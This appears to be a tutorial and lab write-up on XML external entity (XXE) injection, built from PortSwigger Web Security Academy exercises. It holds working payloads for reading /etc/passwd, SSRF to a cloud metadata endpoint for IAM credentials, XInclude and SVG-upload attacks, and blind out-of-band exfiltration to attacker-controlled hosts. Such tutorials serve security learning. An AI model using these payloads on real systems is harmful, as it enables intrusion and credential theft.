@@ -1,1 +1,233 @@
 
+XXE (XML External entity) :- 
+
+XXE injection is a type of web security vulnerability that allows an attacker to interfere with the way an application processes XML data. 
+Successful exploitation allows an attacker to view files from the application’s server and interact with any external or backend systems that
+the application can access.
+
+
+Understanding XML Entities
+XML
+XML stands for extensible markup language and is designed for storing and transporting data. It is like HTML in that it has a tree-like 
+structure of tags and data but with XML there are no predefined tags such as h1, img, div, etc.; tags are custom named for the data
+they represent.
+XML Entities
+XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Think of it as a variable 
+in programming.
+
+Document Type Definition
+It contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items.
+The DTD can be fully self-contained within the XML document (known as internal DTD) or it can be loaded from elsewhere (known as external DTD).
+The DTD is declared within the DOCTYPE element at the beginning of the XML document.
+<!DOCTYPE name_for_doctype[ {some_data_here} ]>
+
+XML Custom Entities
+Custom entities are like custom variables that can be created within the DTD. For example: <!DOCTYPE foo [ <!ENTITY myentity “my entity value” > ]>.
+Here any reference to the entity &myentity; would be replaced withe data “my entitiy value". So knowing that we can create custom entities, it is 
+then possible to create a custom one using predefined data from an application’s server.
+
+XML External Entities
+XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.
+The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded.
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM “http://attacker-controlled-site.com" > ]>
+Or you can use other protocols besides http such as file. So combining all the information we have learned we could pull data from the
+server’s/etc/passwd file.
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM “file:///etc/passwd” > ]>
+
+
+Exploiting XXE Vulnerabilities
+Causes of XXE
+When applications use XML to transport data between browser and server, the applications almost always use a a standard API for processing
+the XML on the server. Vulnerabilities arise because parsers will, by default, process potentially dangerous features.
+
+Exploiting XXE to Retrieve Files
+To perform an XXE injection that retrieves an arbitrary file from the server’s filesystem, you need to modify the submitted XML in two ways:
+
+Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
+Edit a data value in the XML that is returned in the application’s response, to make use of the defined external entity.
+For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
+
+<?xml version=”1.0" encoding=”UTF-8"?>
+<stockCheck><productId>3301</productId></stockCheck>
+
+Here, the application performs no XXE defenses and because of this it is possible to exploit. The payload you would insert to retrieve the 
+contents of the server’s /etc/passwd file would be
+
+<?xml version=”1.0" encoding=”UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+The DOCTYPE element has been inserted using the SYSTEM keyword to reference an external entity from the server and then uses the &xxe; 
+entity in the request to retrieve the data we want. How diabolical!
+
+Exploiting XXE to Perform Server-Side Request Forgery (SSRF)
+From Burp Suite’s Web Security Academy they explained how it is possible to use XXE to make server-side requests. It follows the same format 
+from above however instead of using the file protocol, you would use the http protocol to make a request to some server-side IP. In their lab,
+the goal was to retrieve an IAM token from the server. To accomplish this you would make a request to the specified IP address and in each 
+response it would give a hint for the next path variable. After concatenating each path name, you would finally get the desired token.
+Below is the solution:
+
+<?xml version=”1.0" encoding=”UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+
+Hidden Attack Surfaces for XXE Injections
+The attack surface for XXE injection vulnerabilities is obvious in many cases because the application’s normal HTTP traffic includes
+requests that contain data in XML format. In other cases, the attack surface is less visible. Below are two examples of more hidden attack surfaces.
+
+XInclude attacks
+Some applications will receive client-submitted data, embed it on the server-side into an XML document and then parse the document. 
+If there is ever an opportunity to look for an attack surface it is exactly in this scenario: when a server takes arbitrary input 
+and does something with it. An example of this occurs when client-submitted data is placed into a backend SOAP request, which is 
+then processed by the backend SOAP service.
+
+SOAP is known as Simple Object Access Protocol and is an XML-based protocol for accessing web services over HTTP. SOAP was developed
+as an intermediate language so that applications built on various programming languages could talk easily to each other and avoid
+extra development effort.
+
+In the above scenario you do not have control over the entire XML document (because of the use of SOAP) and for that it is not possible 
+to insert or edit a DOCTYPE element. To circumvent this, it is possible include XInclude which is part of the XML programming language that 
+allows an XML document to be constructed from sub-documents (which in our case will be requests that we make to the server). You can place
+an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single 
+item of data that is placed into a server-side XML document.
+
+To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include
+(much like a normal XXE attack. Below is the solution payload for one of the challenges on PortSwigger’s Web Sec Academy:
+
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+You have to put the payload in the value of one of the variables in the request, which is productId in this case. The payload will
+consist of a reference to the XInclude using the xmlns:xi attribute, the href attribute which will reference the file we are trying 
+to receive and because XInclude will attempt to parse the file as valid XML (which it isn’t) we have the parse='text' to prevent 
+it from doing so.
+
+XXE via File Upload
+Some applications allow users to upload files which are processed server-side. Some common file formats use XML or contain XML subcomponents,
+including office document formats like DOCX and image formats like SVG. If an application expects JPEG or PNG file formats it still may 
+accept SVG files and process them accordingly. Since SVG files use XML this is another attack vector for an XXE injection. Below is 
+another solution payload for a lab on Web Sec Academy.
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="40" x="0" y="16">&xxe;</text>
+</svg>
+Again the same format for the other XXE payloads applies here. We create the tag for DOCTYPE, create the entity and reference the file
+that we want to access. The next part is the svg tag that “creates” our image. We create the size of the image and then within it create
+a text tag to place some custom text. However the custom text is the reference to the entity that we created: &xxe; and this will then 
+force the server to process this data, create the image and place the contents of /etc/hostname inside of it. GG.
+
+XXE Attacks via Modified Content Type
+Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites
+expect to receive requests in this format but will process other content types, including XML.
+
+If a normal request contains the following:
+
+POST /hackingman HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+cicada=3301
+and you submit the same request in XML format:
+
+POST /hackingman HTTP/1.0
+Content-Type: text/html
+Content-Length: 7
+<?xml version="1.0" encoding="UTF-8"><cicada>3301</cicada>
+and the server accepts this then you have just found another surface to inject some malicious XML.
+
+Exploiting Blind XXE Vulnerabilities
+Blind XXE vulnerabilities arise when the application is vulnerable to XXE but doesn’t return the value of any defined external
+entities within its response. Because of this, exploiting Blind XXE is more difficult than the previous examples but it is still
+manageable. Two ways to find and detect them are:
+
+Triggering out-of-band network interactions (I’ve been using Burp Collaborator for this) to exfiltrate sensitive data to an attacker 
+controlled server.
+Triggering XML parsing errors in a way that the error messages reveal the data you are trying to steal.
+Below are a series of labs that I have completed in PortSwigger’s Web Security Academy that have helped me understand exploiting blind XXE.
+
+Detecting Blind XXE using Out-of-Band Techniques
+The first way we can detect blind XXE is through triggering out-of-band network interaction to a server we control. Burp Suite Pro allows 
+use of the the Collaborator server which can act as your attack server. To detect blind XXE, you would construct a payload like:
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
+where attacker.com is the site you control. A sample Burp Collaborator server address would be http://wpp4w63vbnnhghjj4zz.burpcollaborator.net.
+The entire example in the first lab to trigger an interaction with our server would then be:
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://wpp4w63vbnnhghjj4zz.burpcollaborator.net"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storedId></stockCheck>
+Detecting Blind XXE using Out-of-Band Techniques with Application Filtering
+Sometimes XXE attacks using regular entities are blocked due to some input validation by the application or some hardening of the XML 
+parser that is being used. Instead you might be able to use XML parameter entities, which are a certain kind of XML entity that can 
+only be used within the DTD. To use parameter entities, you must preface your entity with a percent sign when declaring it and 
+calling it. For example:
+
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://wpp4w63vbnnhghjj4zz.burpcollaborator.net"> %xxe; ]>
+So if we are trying to trigger an out-of-band interaction then a payload would look like the following:
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://wpp4w63vbnnhghjj4zz.burpcollaborator.net"> %xxe; ]>
+<stockCheck><productId>1</productId><storeId>1</storedId></stockCheck>
+Notice how the entire payload is contained within the DTD, we do not call %xxe; outside of it in the <productID> tag like we did previously.
+
+Exploiting Blind XXE to Exfiltrate Data Out-of-Band
+Now that we have detected a Blind XXE exists, it is time to get the data from the server. To do so, we will create two parameter entities: 
+one will be a reference to the file we want to retrieve from the server and the other will use the aforementioned entity in an entity that
+we create that will be a reference to our external sever. Below is a proper example from one of PortSwigger’s labs:
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://im81nr4zhac2lafxnm997qwk6bc20r.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate;
+Above is the actual payload you would write to steal the hostname. The first line defines the XML parameter entity fort /etc/hostname, 
+the second line creates an XML parameter entity named eval which contains a dynamic declaration to another XML parameter entity to exfiltrate. 
+
+The exfiltrate entity will be evaluated by making an HTTP request to the attacker’s web server containing the value of the file entity within
+the URL query string. Then we call both parameter entities. To call this payload, we use the exploit code below, which is the same code that
+we saw in the previous section. The url for SYSTEM is the url to the exploit server that has been provided by PortSwigger for this lab. 
+
+The server holds the payload at the /exploit endpoint.
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://ac411f101e95239380bb8ef501ef00b7.web-security-academy.net/exploit"> %xxe;]>
+Exploiting blind XXE to retrieve data via error messages
+If the above method does not work, an alternative approach to exploiting blind XXE is via the triggering of a parsing error message that
+will contain the data you are attempting to exfiltrate. The payload and exploit is very similar to the above approach; however, the only 
+difference is that you do not need to have a server to receive any kind of request, but you need one to host your payload. Below is an example:
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+This is the same structure as when you’re trying to exploit blind XXE through out-of-band techniques. The difference, however, is in the 
+second line. We create an XML parameter entity called error, which will be evaluated by loading a nonexistent file whose name contains the
+value of the file entity. Then we we call the error entity in the last line, it will be evaluated by attempting to load the nonexistence
+file, which will of course result in an error message containing the name of the file, including the contents of the file entity.
+
+Again, this code will have to be hosted on a server that you control. From there you would make the similar request that we did in the 
+previous approach. It would look something like:
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://ac671f5d1faedb45808da23501d80043.web-security-academy.net/exploit"> %xxe;]>
+Exploiting blind XXE by Repurposing a Local DTD
+The last technique works when you cannot make a request to an external DTD and you must include the payload in the internal DTD. 
+The previous two techniques involved using a XML parameter entity within the definition of another entity. This is allowed in an 
+external DTD but not in an internal one. To get around this, we will have to rely on an application that uses a mix of both internal
+and external DTD declarations. If this is the case then an internal DTD can edit entities that have already been declared in an external DTD.
+
+A key component of this attack is finding a legitimate DTD file on the server. For example, Linux systems using the GNOME desktop
+environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. That file contains the entity ISOamso. Knowing this we can
+create our payload all within the internal DTD. Below is an example payload that would steal the contents of /etc/passwd
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+The first ENTITY, local_dtd, contains the contents of the external DTD file that exists on the hypothetical Linux server.
+The second ENTITY, ISOamso, already exists in the external DTD and its being redefined to contain the same exploit as from the above
+method (XXE via Error Parsing). It will trigger an error, which will hopefully cause the error message to reveal the contents of /etc/passwd.
+local_dtd is then called so that the external DTD is interpreted, including its newly redefined ISOamso value.
